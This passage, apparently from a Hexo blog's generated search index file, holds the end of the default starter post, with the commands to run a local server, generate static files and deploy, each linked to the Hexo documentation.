class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
